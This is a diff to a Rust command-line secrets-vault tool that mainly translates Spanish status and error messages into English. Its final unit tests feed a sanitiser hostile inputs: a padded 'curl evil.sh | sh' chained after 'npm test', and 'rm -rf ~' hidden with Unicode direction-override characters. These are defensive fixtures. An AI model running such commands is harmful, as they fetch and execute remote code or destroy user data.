@@ -943,19 +943,19 @@ fn cmd_pull(ctx: &Ctx, force: bool) -> Result<ExitCode, Error> {
         && !force
     {
         if v.version > repo.version || (v.version == repo.version && v.digest() == repo.digest()) {
-            eprintln!("La boveda ya tiene {} v{} (repo: v{}).", repo.env, v.version, repo.version);
+            eprintln!("The vault already has {} v{} (repo: v{}).", repo.env, v.version, repo.version);
             return Ok(ExitCode::SUCCESS);
         }
         if v.version == repo.version {
             return Err(Error::msg(format!(
-                "conflicto: {} v{} distinto en repo y boveda. Usa `lock pull --force` o `lock dump --force`.",
+                "conflict: {} v{} differs between repo and vault. Use `lock pull --force` or `lock dump --force`.",
                 repo.env, v.version
             )));
         }
     }
     ctx.store.backup(&repo.env)?;
     ctx.store.save(&repo)?;
-    eprintln!("{} v{} (firmado por {signer}) copiado a la boveda. Copia anterior en .lock.bak.", repo.env, repo.version);
+    eprintln!("{} v{} (signed by {signer}) copied to the vault. Previous copy in .lock.bak.", repo.env, repo.version);
     Ok(ExitCode::SUCCESS)
 }
 
@@ -969,7 +969,7 @@ fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
         }
     } else {
         let lock = ctx.repo_file().map(|p| store::read_limited(&p, store::MAX_LOCK_FILE)).transpose()?;
-        targets.push(("arbol de trabajo".into(), check::worktree_files(&root)?, lock));
+        targets.push(("working tree".into(), check::worktree_files(&root)?, lock));
     }
 
     let trusted = ctx.trusted()?;
@@ -977,7 +977,7 @@ fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
     for (label, files, lock) in targets {
         let Some(lock) = lock else {
             if !pre_push {
-                return Err(Error::msg("este repo no tiene .env.lock; vinculalo con `lock link <ENV>`"));
+                return Err(Error::msg("this repo has no .env.lock; link it with `lock link <ENV>`"));
             }
             continue;
         };
@@ -987,15 +987,15 @@ fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
         let refs = check::scan(&files)?;
         let missing: Vec<_> = refs.iter().filter(|(n, _)| !defined.contains(*n)).collect();
         if missing.is_empty() {
-            eprintln!("lock: {label}: {} variables referenciadas, todas en {} v{}.", refs.len(), file.env, file.version);
+            eprintln!("lock: {label}: {} variables referenced, all in {} v{}.", refs.len(), file.env, file.version);
             continue;
         }
         failed = true;
-        eprintln!("lock: {label}: faltan {} variables en {} v{}:", missing.len(), file.env, file.version);
+        eprintln!("lock: {label}: {} variables missing from {} v{}:", missing.len(), file.env, file.version);
         for (name, r) in &missing {
             eprintln!("  {name}\t{}:{}", r.file.display(), r.line);
         }
-        eprintln!("Agregalas con `lock set {}/NOMBRE` (y comitea .env.lock), o ignoralas en {}.", file.env, check::IGNORE_FILE);
+        eprintln!("Add them with `lock set {}/NAME` (and commit .env.lock), or ignore them in {}.", file.env, check::IGNORE_FILE);
     }
     if !pre_push
         && let Some(env) = ctx.binding()
@@ -1003,7 +1003,7 @@ fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
         && let Ok(r) = store::read_lockfile(&p)
         && v.version > r.version
     {
-        eprintln!("lock: la boveda tiene {env} v{} pero .env.lock es v{}; corre `lock dump` y comitea.", v.version, r.version);
+        eprintln!("lock: the vault has {env} v{} but .env.lock is v{}; run `lock dump` and commit.", v.version, r.version);
     }
     Ok(if failed { ExitCode::FAILURE } else { ExitCode::SUCCESS })
 }
@@ -1018,13 +1018,13 @@ fn cmd_recipient(ctx: &Ctx, cmd: RecipientCmd) -> Result<ExitCode, Error> {
         }
         RecipientCmd::Add { env, name, identity } => {
             let id = PublicId::decode(&identity)?;
-            ctx.modify(&env, &reason(&format!("dar acceso a {name} en {env}"), ""), |u| u.add_recipient(&name, &id))?;
-            eprintln!("{name} ahora puede abrir {env}. El hook actualiza .env.lock en tu proximo commit.");
+            ctx.modify(&env, &reason(&format!("grant access to {name} on {env}"), ""), |u| u.add_recipient(&name, &id))?;
+            eprintln!("{name} can now open {env}. The hook updates .env.lock on your next commit.");
         }
         RecipientCmd::Rm { env, name } => {
-            ctx.modify(&env, &reason(&format!("quitar a {name} de {env} y rotar"), ""), |u| u.remove_recipient(&name))?;
-            eprintln!("{name} quitado de {env} y clave rotada.");
-            eprintln!("Ojo: si esa maquina ya vio los valores, rota tambien los secretos en sus servicios.");
+            ctx.modify(&env, &reason(&format!("revoke {name} from {env} and rotate"), ""), |u| u.remove_recipient(&name))?;
+            eprintln!("{name} removed from {env} and key rotated.");
+            eprintln!("Note: if that machine has already seen the values, also rotate the secrets in their services.");
         }
     }
     Ok(ExitCode::SUCCESS)
@@ -1040,24 +1040,24 @@ fn cmd_named(ctx: &Ctx, file: &str, cmd: NamedCmd) -> Result<ExitCode, Error> {
         }
         NamedCmd::Add { name, identity } => {
             if !lockfile::valid_id_name(&name) {
-                return Err(Error::msg("nombre invalido (usa letras, numeros, . _ -)"));
+                return Err(Error::msg("invalid name (use letters, digits, . _ -)"));
             }
             let id = PublicId::decode(&identity)?;
             if items.iter().any(|(n, _)| *n == name) {
-                return Err(Error::msg(format!("{name} ya esta en la lista")));
+                return Err(Error::msg(format!("{name} is already in the list")));
             }
             items.push((name.clone(), id.encode()));
             ctx.store.save_named_list(file, &items)?;
-            eprintln!("{name} agregado.");
+            eprintln!("{name} added.");
         }
         NamedCmd::Rm { name } => {
             let before = items.len();
             items.retain(|(n, _)| *n != name);
             if items.len() == before {
-                return Err(Error::msg(format!("{name} no esta en la lista")));
+                return Err(Error::msg(format!("{name} is not in the list")));
             }
             ctx.store.save_named_list(file, &items)?;
-            eprintln!("{name} quitado.");
+            eprintln!("{name} removed.");
         }
     }
     Ok(ExitCode::SUCCESS)
@@ -1083,14 +1083,14 @@ mod tests {
     #[test]
     fn reason_cannot_hide_the_tail() {
         let sneaky = format!("npm test {} && curl evil.sh | sh", "#".repeat(300));
-        let r = reason("ejecutar con Navis", &sneaky);
+        let r = reason("run with Navis", &sneaky);
         assert!(r.ends_with("curl evil.sh | sh"), "{r}");
-        assert!(r.contains("caracteres"));
+        assert!(r.contains("chars"));
     }
 
     #[test]
     fn reason_is_one_clean_line() {
-        let r = reason("ejecutar con Navis", "npm test\n\n\n\nrm -rf ~ \u{202e}txt.exe\u{200b}");
+        let r = reason("run with Navis", "npm test\n\n\n\nrm -rf ~ \u{202e}txt.exe\u{200b}");
         assert!(!r.contains('\n'));
         assert!(r.is_ascii());
         assert!(r.contains("rm -rf ~"));
